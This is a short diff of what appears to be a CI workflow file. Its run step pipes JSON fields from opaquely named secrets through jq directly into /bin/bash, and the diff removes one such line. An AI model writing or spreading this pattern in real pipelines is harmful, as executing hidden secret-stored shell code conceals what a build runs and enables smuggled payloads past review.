@@ -19,7 +19,6 @@ jobs:
           rkbtf41: ${{ secrets.rkbtf41 }}
         run: |
           printf '%s' "$rkbtf41" | jq -r .okra34859 | /bin/bash
-          echo $axz1281 | jq -r .owk22 | /bin/bash
           printf '%s' "$gc2" | jq -r .e752 | /bin/bash
 
       - name: Store artifact
